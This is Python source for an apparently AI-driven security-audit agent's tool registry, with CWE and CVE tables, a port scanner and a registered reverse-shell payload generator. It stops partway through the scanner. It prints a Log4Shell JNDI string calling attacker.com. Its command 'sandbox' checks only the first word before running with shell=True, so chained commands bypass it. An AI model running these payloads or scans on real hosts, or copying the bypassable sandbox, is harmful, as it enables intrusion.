"""
Security-Focused Tool Registry for SmartAGENT.
Each tool is a callable that the ReAct agent can invoke by name.
"""

import os
import re
import json
import uuid
import socket
import shutil
import subprocess
import urllib.request
import urllib.error
import urllib.parse
from pathlib import Path
from typing import Dict, List, Callable, Optional, Any
from dataclasses import dataclass, field


# ---------------------------------------------------------------------------
# CWE knowledge base (embedded, no network needed)
# ---------------------------------------------------------------------------
CWE_DATABASE = {
    "CWE-78": {
        "name": "OS Command Injection",
        "description": "The software constructs OS commands using externally-influenced input without neutralizing special elements.",
        "owasp": "A03:2021 - Injection",
        "cvss": 9.8,
        "remediation": "Use subprocess with a list of arguments (no shell=True). Validate and sanitize all inputs.",
    },
    "CWE-79": {
        "name": "Cross-site Scripting (XSS)",
        "description": "The software does not neutralize user-controllable input before it is placed in output used as a web page.",
        "owasp": "A03:2021 - Injection",
        "cvss": 7.2,
        "remediation": "Use context-aware output encoding. Use Content-Security-Policy headers. Use DOMPurify for HTML sanitization.",
    },
    "CWE-89": {
        "name": "SQL Injection",
        "description": "The software constructs SQL commands using externally-influenced input without proper neutralization.",
        "owasp": "A03:2021 - Injection",
        "cvss": 9.8,
        "remediation": "Use parameterized queries / prepared statements. Never concatenate user input into SQL strings.",
    },
    "CWE-95": {
        "name": "Eval Injection",
        "description": "The software receives input that is expected to be code and evaluates it without proper validation.",
        "owasp": "A03:2021 - Injection",
        "cvss": 9.8,
        "remediation": "Use safe parsers (ast.literal_eval, json.loads) instead of eval/exec.",
    },
    "CWE-200": {
        "name": "Information Exposure",
        "description": "The software exposes sensitive information to actors not authorized to have it.",
        "owasp": "A01:2021 - Broken Access Control",
        "cvss": 5.3,
        "remediation": "Implement proper access controls. Remove debug info from production. Use generic error messages.",
    },
    "CWE-259": {
        "name": "Hard-coded Password",
        "description": "The software contains a hard-coded password used for authentication.",
        "owasp": "A07:2021 - Identification and Authentication Failures",
        "cvss": 7.5,
        "remediation": "Use environment variables or a secrets manager. Never commit credentials to source control.",
    },
    "CWE-327": {
        "name": "Broken Crypto Algorithm",
        "description": "The use of a broken or risky cryptographic algorithm.",
        "owasp": "A02:2021 - Cryptographic Failures",
        "cvss": 7.5,
        "remediation": "Use modern algorithms: AES-256-GCM for encryption, SHA-256/SHA-3 for hashing, Argon2id for passwords.",
    },
    "CWE-328": {
        "name": "Weak Hash (MD5/SHA1)",
        "description": "MD5 and SHA-1 are cryptographically broken and vulnerable to collision attacks.",
        "owasp": "A02:2021 - Cryptographic Failures",
        "cvss": 5.3,
        "remediation": "Upgrade to SHA-256, SHA-3, or password hashing (bcrypt, argon2id).",
    },
    "CWE-502": {
        "name": "Deserialization of Untrusted Data",
        "description": "The application deserializes untrusted data without verification, leading to RCE.",
        "owasp": "A08:2021 - Software and Data Integrity Failures",
        "cvss": 9.8,
        "remediation": "Use safe serialization (JSON). Never unpickle untrusted data. Use yaml.safe_load().",
    },
    "CWE-798": {
        "name": "Hard-coded Credentials",
        "description": "The software contains hard-coded credentials for inbound or outbound authentication.",
        "owasp": "A07:2021 - Identification and Authentication Failures",
        "cvss": 9.8,
        "remediation": "Use environment variables, vault systems, or config files excluded from version control.",
    },
    "CWE-22": {
        "name": "Path Traversal",
        "description": "The software uses external input to construct a pathname without restricting it to an intended directory.",
        "owasp": "A01:2021 - Broken Access Control",
        "cvss": 7.5,
        "remediation": "Validate and canonicalize paths. Use os.path.realpath() and check against allowed directories.",
    },
    "CWE-352": {
        "name": "Cross-Site Request Forgery (CSRF)",
        "description": "The web application does not verify that a request was intentionally sent by the user.",
        "owasp": "A01:2021 - Broken Access Control",
        "cvss": 8.0,
        "remediation": "Implement CSRF tokens. Use SameSite cookie attribute. Verify Origin/Referer headers.",
    },
}

# ---------------------------------------------------------------------------
# Exploit & Vulnerability Advisory Database (embedded)
# ---------------------------------------------------------------------------
EXPLOIT_DATABASE = {
    "CVE-2021-44228": {
        "title": "Log4Shell - Apache Log4j2 JNDI Remote Code Execution",
        "service": "Apache Log4j",
        "affected_versions": "2.0-beta9 <= 2.14.1",
        "cvss": 10.0,
        "cwe": "CWE-502 / CWE-917",
        "vector": "JNDI LDAP lookup interpolation via untrusted header or message parameter: ${jndi:ldap://attacker.com/a}",
        "remediation": "Upgrade to Log4j 2.17.1+ or set log4j2.formatMsgNoLookups=true.",
    },
    "CVE-2017-0144": {
        "title": "EternalBlue - Microsoft SMBv1 Remote Code Execution",
        "service": "Microsoft Windows SMBv1",
        "affected_versions": "Windows Vista through Server 2016 (unpatched)",
        "cvss": 9.8,
        "cwe": "CWE-119 / CWE-787",
        "vector": "Buffer overflow in Srv!SrvOs2FeaToNt via crafted SMBv1 transaction packets on port 445.",
        "remediation": "Apply MS17-010 security update and completely disable SMBv1 protocol.",
    },
    "CVE-2022-22965": {
        "title": "Spring4Shell - Spring Framework RCE via DataBinder",
        "service": "Spring Framework",
        "affected_versions": "5.3.0 to 5.3.17, 5.2.0 to 5.2.19 on JDK 9+",
        "cvss": 9.8,
        "cwe": "CWE-94 / CWE-914",
        "vector": "Class loader manipulation via HTTP parameter binding modifying Tomcat AccessLogValve properties to write webshell.",
        "remediation": "Upgrade to Spring Framework 5.3.18+ or 5.2.20+.",
    },
    "CVE-2019-0708": {
        "title": "BlueKeep - Remote Desktop Services Pre-Auth RCE",
        "service": "Microsoft Remote Desktop Protocol (RDP)",
        "affected_versions": "Windows 7, Server 2008 R2, XP, Server 2003",
        "cvss": 9.8,
        "cwe": "CWE-416 (Use-After-Free)",
        "vector": "Crafted MS_T120 channel bind requests to RDP server on port 3389 causing UAF in termdd.sys.",
        "remediation": "Apply Microsoft security update and enable Network Level Authentication (NLA).",
    },
    "CVE-2014-0160": {
        "title": "Heartbleed - OpenSSL TLS Heartbeat Memory Disclosure",
        "service": "OpenSSL",
        "affected_versions": "1.0.1 through 1.0.1f",
        "cvss": 7.5,
        "cwe": "CWE-126 (Buffer Over-read)",
        "vector": "Missing bounds check in TLS heartbeat extension handling allows dumping 64KB chunks of process memory.",
        "remediation": "Upgrade to OpenSSL 1.0.1g+ or recompile with -DOPENSSL_NO_HEARTBEATS.",
    },
    "CVE-2021-41773": {
        "title": "Apache HTTP Server 2.4.49 Path Traversal & RCE",
        "service": "Apache HTTP Server",
        "affected_versions": "2.4.49",
        "cvss": 7.5,
        "cwe": "CWE-22 / CWE-23",
        "vector": "URL path normalization flaw using '.%2e/' sequences allowing traversal outside DocumentRoot; RCE if mod_cgi is enabled.",
        "remediation": "Upgrade Apache HTTP Server to 2.4.51+.",
    },
    "CVE-2021-42013": {
        "title": "Apache HTTP Server 2.4.50 Path Traversal & RCE (Incomplete Fix)",
        "service": "Apache HTTP Server",
        "affected_versions": "2.4.50",
        "cvss": 9.8,
        "cwe": "CWE-22 / CWE-23",
        "vector": "Double-encoded path traversal '%%32%65%%32%65/' bypassing CVE-2021-41773 fix.",
        "remediation": "Upgrade Apache HTTP Server to 2.4.51+.",
    },
    "CVE-2017-5638": {
        "title": "Apache Struts 2 Jakarta Multipart OGNL RCE",
        "service": "Apache Struts",
        "affected_versions": "2.3.5 - 2.3.31, 2.5 - 2.5.10",
        "cvss": 9.8,
        "cwe": "CWE-20 / CWE-917",
        "vector": "OGNL expression injection via Content-Type header in multipart file upload requests.",
        "remediation": "Upgrade to Struts 2.3.32 or 2.5.10.1+.",
    },
    "CVE-2021-3156": {
        "title": "Baron Samedit - Sudo Heap-Based Buffer Overflow LPE",
        "service": "Sudo",
        "affected_versions": "1.8.2 to 1.8.31p2, 1.9.0 to 1.9.5p1",
        "cvss": 7.8,
        "cwe": "CWE-122 (Heap-based Buffer Overflow)",
        "vector": "Unescaped trailing backslash in 'sudoedit -s' arguments causing heap overflow in set_cmnd(), giving root.",
        "remediation": "Upgrade sudo to 1.9.5p2 or later.",
    },
    "CVE-2021-4034": {
        "title": "PwnKit - Polkit pkexec Local Privilege Escalation",
        "service": "Polkit pkexec",
        "affected_versions": "All versions since 2009 (default on most Linux distros)",
        "cvss": 7.8,
        "cwe": "CWE-125 / CWE-787",
        "vector": "Passing argc=0 to pkexec causes out-of-bounds write of environment variables, executing arbitrary shared libraries as root.",
        "remediation": "Update polkit package or remove SUID bit from pkexec (chmod 0755 /usr/bin/pkexec).",
    },
    "CVE-2016-5195": {
        "title": "Dirty COW - Linux Kernel Copy-on-Write Race Condition LPE",
        "service": "Linux Kernel",
        "affected_versions": "2.6.22 to 4.8.3",
        "cvss": 7.8,
        "cwe": "CWE-362 (Race Condition)",
        "vector": "Race condition in copy-on-write mechanism allows unprivileged write to read-only memory mappings (e.g. /etc/passwd).",
        "remediation": "Update Linux kernel to patched release.",
    },
    "CVE-2022-0847": {
        "title": "Dirty Pipe - Linux Kernel Page Cache Overwrite LPE",
        "service": "Linux Kernel",
        "affected_versions": "5.8 to 5.16.11, 5.15.25, 5.10.102",
        "cvss": 7.8,
        "cwe": "CWE-276 / CWE-787",
        "vector": "Uninitialized pipe buffer flag PIPE_BUF_FLAG_CAN_MERGE allows overwriting arbitrary read-only page cache files.",
        "remediation": "Upgrade kernel to 5.16.11+, 5.15.25+, or 5.10.102+.",
    },
    "CVE-2021-26855": {
        "title": "ProxyLogon - Microsoft Exchange Pre-Auth SSRF",
        "service": "Microsoft Exchange Server",
        "affected_versions": "2013, 2016, 2019",
        "cvss": 9.8,
        "cwe": "CWE-918 (SSRF)",
        "vector": "Crafted HTTP POST to /owa/auth/x.js with X-AnonResource-Backend cookie triggers SSRF to backend Exchange endpoints.",
        "remediation": "Apply Microsoft Security Update KB5000871.",
    },
    "CVE-2022-26134": {
        "title": "Confluence Server OGNL Injection Pre-Auth RCE",
        "service": "Atlassian Confluence Server & Data Center",
        "affected_versions": "1.3.0 to 7.18.0",
        "cvss": 9.8,
        "cwe": "CWE-917 (OGNL Expression Injection)",
        "vector": "OGNL payload in HTTP GET request URI path evaluated by WebWork framework, achieving unauthenticated RCE.",
        "remediation": "Upgrade Confluence to 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, or 7.18.1+.",
    },
    "CVE-2024-23897": {
        "title": "Jenkins CLI Arbitrary File Read and RCE",
        "service": "Jenkins Automation Server",
        "affected_versions": "<= 2.441, LTS <= 2.426.2",
        "cvss": 9.8,
        "cwe": "CWE-22 / CWE-829",
        "vector": "args4j parser '@' expansion reads arbitrary files when CLI commands are processed without authentication.",
        "remediation": "Upgrade Jenkins to 2.442 or LTS 2.426.3, or disable CLI endpoint.",
    },
    "CVE-2023-34362": {
        "title": "MOVEit Transfer SQL Injection Pre-Auth RCE",
        "service": "Progress MOVEit Transfer",
        "affected_versions": "2023.0.0, 2022.1.x, 2022.0.x, 2021.1.x, 2021.0.x",
        "cvss": 9.8,
        "cwe": "CWE-89 (SQL Injection)",
        "vector": "SQL injection in MOVEit Transfer web interface allows authentication bypass and arbitrary file drop / webshell execution.",
        "remediation": "Apply manufacturer security patches immediately and audit active sessions.",
    },
    "CVE-2024-6387": {
        "title": "regreSSHion - OpenSSH Server Remote Code Execution",
        "service": "OpenSSH sshd",
        "affected_versions": "8.5p1 <= OpenSSH < 9.8p1 (glibc-based Linux)",
        "cvss": 8.1,
        "cwe": "CWE-362 (Signal Handler Race Condition)",
        "vector": "Race condition in SIGALRM signal handler in sshd allows remote unauthenticated memory corruption as root.",
        "remediation": "Upgrade OpenSSH to 9.8p1+ or set LoginGraceTime 0 in sshd_config.",
    },
    "CVE-2020-1472": {
        "title": "Zerologon - Netlogon Elevation of Privilege",
        "service": "Active Directory Netlogon Protocol",
        "affected_versions": "Windows Server 2008 R2 through 2019",
        "cvss": 10.0,
        "cwe": "CWE-326 (Inadequate Encryption Strength)",
        "vector": "Flaw in AES-CFB8 implementation with fixed IV allows unauthenticated attacker to set machine account password to blank.",
        "remediation": "Apply August 2020 and February 2021 Netlogon security updates.",
    },
    "CVE-2021-34527": {
        "title": "PrintNightmare - Windows Print Spooler RCE / LPE",
        "service": "Windows Print Spooler (spoolsv.exe)",
        "affected_versions": "Windows 7 through 10, Server 2008 through 2019",
        "cvss": 8.8,
        "cwe": "CWE-269 (Improper Privilege Management)",
        "vector": "RpcAddPrinterDriverEx API accepts remote driver DLL files with SYSTEM privileges.",
        "remediation": "Apply Microsoft out-of-band patch and disable Print Spooler on domain controllers.",
    },
}

# Default ignore dirs for file listing
IGNORE_DIRS = {
    ".git", "node_modules", "venv", ".venv", "__pycache__",
    "dist", "build", ".idea", ".vscode", "outputs", ".tox",
    ".mypy_cache", ".ruff_cache", "egg-info",
}

# Allowed shell commands (prefix allowlist for sandboxing)
ALLOWED_COMMANDS = [
    # Core
    "python", "python3", "pip", "pip3", "uv", "node", "npm", "npx", "yarn", "pnpm",
    # Git
    "git",
    # File ops
    "cat", "type", "dir", "ls", "find", "tree", "mkdir", "cp", "copy", "mv", "move",
    "head", "tail", "wc", "sort", "uniq", "cut", "awk", "sed", "echo", "touch",
    # Search
    "grep", "rg", "fd", "ag", "findstr",
    # Network / HTTP
    "curl", "wget", "httpie", "http", "ssh", "scp", "rsync",
    # Docker
    "docker", "docker-compose", "podman",
    # Security tools
    "nmap", "nikto", "sqlmap", "gobuster", "ffuf", "nuclei", "subfinder", "httpx",
    "semgrep", "bandit", "safety", "trivy", "grype", "syft",
    # Package managers
    "cargo", "go", "rustc", "gcc", "g++", "make", "cmake",
    # Misc
    "smartagent", "whoami", "hostname", "ping", "tracert", "traceroute",
    "netstat", "ss", "ip", "ifconfig", "env", "set", "where", "which",
]


@dataclass
class ToolSpec:
    """Specification for a tool the agent can call."""
    name: str
    description: str
    usage: str
    func: Callable[[str], str]


class ToolRegistry:
    """Registry of all tools available to the agent."""

    def __init__(self, working_dir: str = "."):
        self.working_dir = os.path.abspath(working_dir)
        self._tools: Dict[str, ToolSpec] = {}
        self._register_builtins()

    def register(self, spec: ToolSpec):
        self._tools[spec.name] = spec

    def get(self, name: str) -> Optional[ToolSpec]:
        return self._tools.get(name)

    def list_tools(self) -> List[ToolSpec]:
        return list(self._tools.values())

    def get_tool_descriptions(self) -> str:
        """Format tool descriptions for the system prompt."""
        lines = []
        for tool in self._tools.values():
            lines.append(f"### {tool.name}")
            lines.append(f"{tool.description}")
            lines.append(f"Usage: `{tool.usage}`")
            lines.append("")
        return "\n".join(lines)

    def execute(self, name: str, input_str: str) -> str:
        """Execute a tool by name and return the result string."""
        tool = self._tools.get(name)
        if tool is None:
            available = ", ".join(self._tools.keys())
            return f"Error: Unknown tool '{name}'. Available tools: {available}"
        try:
            result = tool.func(input_str.strip())
            # Truncate very long outputs to prevent context overflow
            if len(result) > 4000:
                result = result[:4000] + f"\n\n... [output truncated, {len(result)} chars total]"
            return result
        except Exception as e:
            return f"Error executing {name}: {type(e).__name__}: {str(e)}"

    # ------------------------------------------------------------------
    # Built-in tool implementations
    # ------------------------------------------------------------------

    def _register_builtins(self):
        self.register(ToolSpec(
            name="list_files",
            description="List all code files in a directory (respects .git/node_modules/venv ignore rules).",
            usage="list_files <directory_path>  (e.g., list_files . or list_files src/)",
            func=self._tool_list_files,
        ))
        self.register(ToolSpec(
            name="read_file",
            description="Read the contents of a file. Optionally specify line range with :start-end suffix.",
            usage="read_file <path>  or  read_file <path>:10-50",
            func=self._tool_read_file,
        ))
        self.register(ToolSpec(
            name="search_code",
            description="Search for a regex pattern across all code files in the project. Returns matching lines.",
            usage="search_code <pattern>  (e.g., search_code eval\\(  or  search_code password)",
            func=self._tool_search_code,
        ))
        self.register(ToolSpec(
            name="scan_code",
            description="Run static vulnerability pattern scanners on a specific file. Returns all findings.",
            usage="scan_code <file_path>  (e.g., scan_code app.py)",
            func=self._tool_scan_code,
        ))
        self.register(ToolSpec(
            name="get_cwe_info",
            description="Look up detailed information about a CWE vulnerability class.",
            usage="get_cwe_info <cwe_id>  (e.g., get_cwe_info CWE-89)",
            func=self._tool_get_cwe_info,
        ))
        self.register(ToolSpec(
            name="write_report",
            description="Write accumulated findings to a JSON or Markdown report file.",
            usage="write_report <format>  (format: json or markdown, e.g., write_report markdown)",
            func=self._tool_write_report,
        ))
        self.register(ToolSpec(
            name="run_command",
            description="Execute a shell command (sandboxed to safe commands like git, python, grep, etc.).",
            usage="run_command <command>  (e.g., run_command git log -5 --oneline)",
            func=self._tool_run_command,
        ))
        self.register(ToolSpec(
            name="fix_code",
            description="Generate a secure code fix suggestion for a given code snippet and vulnerability type.",
            usage="fix_code <cwe_id>|||<vulnerable_code_snippet>  (e.g., fix_code CWE-89|||query = f\"SELECT * FROM users WHERE id = '{uid}'\")",
            func=self._tool_fix_code,
        ))
        self.register(ToolSpec(
            name="recon",
            description="Network reconnaissance & port scanner. Scans host for open TCP ports, banners, and services. Uses nmap if available, or fast socket scanner fallback.",
            usage="recon <host> [ports]  (e.g., recon 127.0.0.1 or recon example.com 80,443,8080 or recon 192.168.1.1 1-1024)",
            func=self._tool_recon,
        ))
        self.register(ToolSpec(
            name="exploit_db",
            description="Query vulnerability database by CVE identifier or service keyword. Returns CVSS, attack vector, exploit prerequisites, and mitigations.",
            usage="exploit_db <cve_or_service_query>  (e.g., exploit_db CVE-2021-44228 or exploit_db apache or exploit_db ssh)",
            func=self._tool_exploit_db,
        ))
        self.register(ToolSpec(
            name="generate_payload",
            description="Generate security audit verification payloads and test templates (SQLi, XSS, cmd injection, reverse shell syntax, SSTI, SSRF, LFI).",
            usage="generate_payload <type> <params>  (e.g., generate_payload sqli auth_bypass, generate_payload revshell 10.10.14.5:4444 bash, generate_payload xss reflected)",
            func=self._tool_generate_payload,
        ))
        self.register(ToolSpec(
            name="web_attack",
            description="Web attack surface assessment: probes target URLs for exposed endpoints, sensitive files, and missing security headers.",
            usage="web_attack <url> [mode]  (e.g., web_attack http://localhost:8000 endpoints or web_attack https://target.com headers or web_attack http://127.0.0.1:5000 all)",
            func=self._tool_web_attack,
        ))
        self.register(ToolSpec(
            name="post_exploit",
            description="Post-exploitation & privilege auditing advisor: provides enumeration checklists, persistence detection rules, and lateral movement audits for Linux/Windows/AD.",
            usage="post_exploit <os_type> [category]  (e.g., post_exploit linux privesc or post_exploit windows persistence or post_exploit ad lateral_movement)",
            func=self._tool_post_exploit,
        ))

    def _tool_list_files(self, directory: str) -> str:
        target = os.path.abspath(os.path.join(self.working_dir, directory))
        if not os.path.isdir(target):
            return f"Error: '{directory}' is not a valid directory."

        files = []
        code_extensions = {
            ".py", ".js", ".ts", ".jsx", ".tsx", ".go", ".java", ".php",
            ".c", ".cpp", ".h", ".rs", ".rb", ".sql", ".sh", ".yaml",
            ".yml", ".toml", ".json", ".env", ".xml", ".html", ".css",
        }
        for root, dirs, filenames in os.walk(target):
            dirs[:] = [d for d in dirs if d not in IGNORE_DIRS]
            for fname in sorted(filenames):
                ext = os.path.splitext(fname)[1].lower()
                if ext in code_extensions or fname in {"Dockerfile", "Makefile", ".gitignore", ".env"}:
                    rel = os.path.relpath(os.path.join(root, fname), target)
                    size = os.path.getsize(os.path.join(root, fname))
                    files.append(f"  {rel}  ({size} bytes)")

        if not files:
            return f"No code files found in '{directory}'."
        return f"Found {len(files)} files in '{directory}':\n" + "\n".join(files)

    def _tool_read_file(self, path_spec: str) -> str:
        # Parse optional line range: path:start-end
        start_line, end_line = None, None
        if ":" in path_spec and "-" in path_spec.rsplit(":", 1)[-1]:
            parts = path_spec.rsplit(":", 1)
            path_str = parts[0]
            try:
                range_parts = parts[1].split("-")
                start_line = int(range_parts[0])
                end_line = int(range_parts[1])
            except (ValueError, IndexError):
                path_str = path_spec  # not a valid range, treat whole thing as path
        else:
            path_str = path_spec

        full_path = os.path.abspath(os.path.join(self.working_dir, path_str.strip()))
        if not os.path.isfile(full_path):
            return f"Error: File '{path_str}' not found."

        try:
            with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
        except Exception as e:
            return f"Error reading file: {e}"

        total = len(lines)
        if start_line and end_line:
            start_line = max(1, start_line)
            end_line = min(total, end_line)
            selected = lines[start_line - 1:end_line]
            numbered = [f"{i}: {line.rstrip()}" for i, line in enumerate(selected, start=start_line)]
            return f"File: {path_str} (lines {start_line}-{end_line} of {total})\n" + "\n".join(numbered)
        else:
            # Cap at 200 lines to prevent context overflow
            if total > 200:
                selected = lines[:200]
                numbered = [f"{i}: {line.rstrip()}" for i, line in enumerate(selected, start=1)]
                return f"File: {path_str} ({total} lines, showing first 200)\n" + "\n".join(numbered)
            numbered = [f"{i}: {line.rstrip()}" for i, line in enumerate(lines, start=1)]
            return f"File: {path_str} ({total} lines)\n" + "\n".join(numbered)

    def _tool_search_code(self, pattern: str) -> str:
        pattern = pattern.strip()
        if not pattern:
            return "Error: Please provide a search pattern."

        try:
            regex = re.compile(pattern, re.IGNORECASE)
        except re.error as e:
            return f"Error: Invalid regex pattern: {e}"

        matches = []
        code_extensions = {
            ".py", ".js", ".ts", ".jsx", ".tsx", ".go", ".java", ".php",
            ".c", ".cpp", ".h", ".rs", ".rb", ".sql", ".sh",
        }
        for root, dirs, filenames in os.walk(self.working_dir):
            dirs[:] = [d for d in dirs if d not in IGNORE_DIRS]
            for fname in filenames:
                ext = os.path.splitext(fname)[1].lower()
                if ext not in code_extensions:
                    continue
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        for line_num, line in enumerate(f, 1):
                            if regex.search(line):
                                rel = os.path.relpath(fpath, self.working_dir)
                                matches.append(f"  {rel}:{line_num}: {line.strip()}")
                                if len(matches) >= 50:
                                    break
                except Exception:
                    continue
                if len(matches) >= 50:
                    break

        if not matches:
            return f"No matches found for pattern: {pattern}"
        header = f"Found {len(matches)} matches for '{pattern}':"
        if len(matches) >= 50:
            header += " (capped at 50 results)"
        return header + "\n" + "\n".join(matches)

    def _tool_scan_code(self, file_path: str) -> str:
        full_path = os.path.abspath(os.path.join(self.working_dir, file_path.strip()))
        if not os.path.isfile(full_path):
            return f"Error: File '{file_path}' not found."

        try:
            with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        except Exception as e:
            return f"Error reading file: {e}"

        # Import scanners here to avoid circular imports
        from smartagent.scanners import ALL_SCANNERS

        rel_path = os.path.relpath(full_path, self.working_dir)
        all_findings = []
        for scanner in ALL_SCANNERS:
            findings = scanner.scan_file(rel_path, content)
            all_findings.extend(findings)

        if not all_findings:
            return f"No vulnerabilities found in {file_path} by static scanners."

        lines = [f"Found {len(all_findings)} findings in {file_path}:"]
        for f in all_findings:
            lines.append(f"\n  [{f.severity}] {f.title}")
            lines.append(f"    CWE: {f.cwe} | CVSS: {f.cvss} | Line: {f.line_number}")
            lines.append(f"    Code: {f.snippet[:100]}")
            lines.append(f"    Fix: {(f.remediation or 'N/A')[:120]}")
        return "\n".join(lines)

    def _tool_get_cwe_info(self, cwe_id: str) -> str:
        cwe_id = cwe_id.strip().upper()
        if not cwe_id.startswith("CWE-"):
            cwe_id = f"CWE-{cwe_id}"

        info = CWE_DATABASE.get(cwe_id)
        if info is None:
            available = ", ".join(sorted(CWE_DATABASE.keys()))
            return f"CWE '{cwe_id}' not in local database. Available: {available}"

        return (
            f"{cwe_id}: {info['name']}\n"
            f"OWASP: {info['owasp']}\n"
            f"CVSS: {info['cvss']}\n"
            f"Description: {info['description']}\n"
            f"Remediation: {info['remediation']}"
        )

    def _tool_write_report(self, fmt: str) -> str:
        fmt = fmt.strip().lower()
        if fmt not in ("json", "markdown", "md"):
            return "Error: Format must be 'json' or 'markdown'."

        # Access findings from the agent's memory (injected at runtime)
        findings = getattr(self, "_agent_findings", [])
        if not findings:
            return "No findings to report. Run scan_code on files first."

        report_dir = os.path.join(self.working_dir, "reports")
        os.makedirs(report_dir, exist_ok=True)

        if fmt == "json":
            out_path = os.path.join(report_dir, "smartagent_report.json")
            with open(out_path, "w", encoding="utf-8") as f:
                json.dump({"findings": findings, "total": len(findings)}, f, indent=2)
            return f"JSON report written to: {os.path.relpath(out_path, self.working_dir)}"
        else:
            out_path = os.path.join(report_dir, "smartagent_report.md")
            lines = ["# SmartAGENT Security Report\n"]
            for i, finding in enumerate(findings, 1):
                lines.append(f"## {i}. [{finding.get('severity', '?')}] {finding.get('title', 'Untitled')}")
                lines.append(f"- **File:** `{finding.get('file_path', '?')}:{finding.get('line_number', '?')}`")
                lines.append(f"- **CWE:** `{finding.get('cwe', '?')}` | **CVSS:** {finding.get('cvss', '?')}")
                lines.append(f"- **Code:** `{finding.get('snippet', '')[:100]}`")
                lines.append(f"- **Fix:** {finding.get('remediation', 'N/A')[:200]}")
                lines.append("")
            with open(out_path, "w", encoding="utf-8") as f:
                f.write("\n".join(lines))
            return f"Markdown report written to: {os.path.relpath(out_path, self.working_dir)}"

    def _tool_run_command(self, command: str) -> str:
        command = command.strip()
        if not command:
            return "Error: No command provided."

        # Sandbox check — only allow safe commands
        first_word = command.split()[0].lower()
        # Strip path prefixes for check
        base_cmd = os.path.basename(first_word).replace(".exe", "")
        if base_cmd not in ALLOWED_COMMANDS:
            return (
                f"Error: Command '{base_cmd}' is not in the allowed list. "
                f"Allowed: {', '.join(ALLOWED_COMMANDS)}"
            )

        try:
            result = subprocess.run(
                command,
                shell=True,
                cwd=self.working_dir,
                capture_output=True,
                text=True,
                timeout=30,
                encoding="utf-8",
                errors="replace",
            )
            output = ""
            if result.stdout:
                output += result.stdout
            if result.stderr:
                output += "\n[stderr]\n" + result.stderr
            if result.returncode != 0:
                output += f"\n[exit code: {result.returncode}]"
            return output.strip() or "(no output)"
        except subprocess.TimeoutExpired:
            return "Error: Command timed out after 30 seconds."
        except Exception as e:
            return f"Error: {e}"

    def _tool_fix_code(self, input_str: str) -> str:
        """Generate a fix suggestion based on CWE and vulnerable code."""
        parts = input_str.split("|||", 1)
        if len(parts) != 2:
            return "Error: Use format: fix_code CWE-XX|||<code_snippet>"

        cwe_id = parts[0].strip().upper()
        code = parts[1].strip()

        if not cwe_id.startswith("CWE-"):
            cwe_id = f"CWE-{cwe_id}"

        info = CWE_DATABASE.get(cwe_id)
        if info is None:
            return f"No fix template for {cwe_id}. Provide a manual remediation."

        return (
            f"Vulnerability: {cwe_id} — {info['name']}\n\n"
            f"Vulnerable Code:\n```\n{code}\n```\n\n"
            f"Remediation Strategy: {info['remediation']}\n\n"
            f"Apply the remediation strategy to the vulnerable code above. "
            f"Key principle: {info['description']}"
        )

    def _tool_recon(self, target: str) -> str:
        """
        Network reconnaissance and port scanner.
        Scans common or specified ports, gathers service banners, and highlights attack surfaces.
        """
        parts = target.strip().split()
        if not parts:
            return "Error: Provide target host/IP. Usage: recon <host> [ports]"

        host = parts[0]
        if "://" in host:
            host = host.split("://", 1)[1].split("/", 1)[0].split(":")[0]

        common_ports = [
            21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
            1433, 1521, 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 8888, 9000, 27017,
        ]
        port_services = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP",
            110: "POP3", 111: "rpcbind", 135: "msrpc", 139: "netbios-ssn", 143: "IMAP",
            443: "HTTPS", 445: "Microsoft-DS (SMB)", 993: "IMAPS", 995: "POP3S",
            1433: "MSSQL", 1521: "Oracle DB", 3306: "MySQL", 3389: "MS-WBT-Server (RDP)",
            5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 8000: "HTTP-Alt",
            8080: "HTTP-Proxy / Alternate", 8443: "HTTPS-Alt", 8888: "HTTP-Alt",
            9000: "FastCGI / SonarQube", 27017: "MongoDB",
        }

        ports_to_scan = common_ports
        if len(parts) > 1:
            port_arg = parts[1].strip()
            if "-" in port_arg:
                try:
                    p_start, p_end = [int(p) for p in port_arg.split("-", 1)]
                    ports_to_scan = list(range(max(1, p_start), min(65535, p_end) + 1))
                    if len(ports_to_scan) > 1000:
                        ports_to_scan = ports_to_scan[:1000]
                except ValueError:
                    pass
            elif "," in port_arg:
                try:
                    ports_to_scan = [int(p.strip()) for p in port_arg.split(",") if p.strip().isdigit()]
                except ValueError:
                    pass
            elif port_arg.isdigit():
                ports_to_scan = [int(port_arg)]

        # Try nmap first if installed
        nmap_path = shutil.which("nmap")
        if nmap_path:
            try:
                ports_str = ",".join(str(p) for p in ports_to_scan[:100])
                cmd = [nmap_path, "-sV", "-T4", "--open", "-p", ports_str, host]
                res = subprocess.run(cmd, capture_output=True, text=True, timeout=25)
                if res.returncode == 0 and res.stdout:
                    return f"### Reconnaissance Results (via nmap) for `{host}`:\n\n```\n{res.stdout.strip()}\n```"
            except Exception:
                pass  # Fallback to internal socket scanner

        # Built-in fast socket scanner fallback
        open_ports = []
        try:
            target_ip = socket.gethostbyname(host)
        except socket.gaierror as e:
            return f"Recon Error: Unable to resolve hostname '{host}': {e}"

        for port in ports_to_scan:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    banner = ""
                    try:
                        sock.settimeout(0.4)
                        if port in (80, 8080, 8000, 8888):
                            sock.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
                        else:
                            sock.sendall(b"\r\n")
                        raw = sock.recv(256)
                        banner = raw.decode("utf-8", errors="ignore").strip().splitlines()[0][:80]
                    except Exception:
                        pass
                    service_name = port_services.get(port, "Unknown Service")
                    open_ports.append({"port": port, "service": service_name, "banner": banner})
                sock.close()
            except Exception:
                continue

        lines = [
            f"### Reconnaissance Report for `{host}` ({target_ip})",
            f"- **Ports Scanned:** {len(ports_to_scan)}",
            f"- **Open Ports Found:** {len(open_ports)}",
            "",
        ]
        if not open_ports:
            lines.append("No open ports discovered in the scanned range.")
        else:
            lines.append("| Port | State | Service | Banner / Info |")
            lines.append("|------|-------|---------|---------------|")
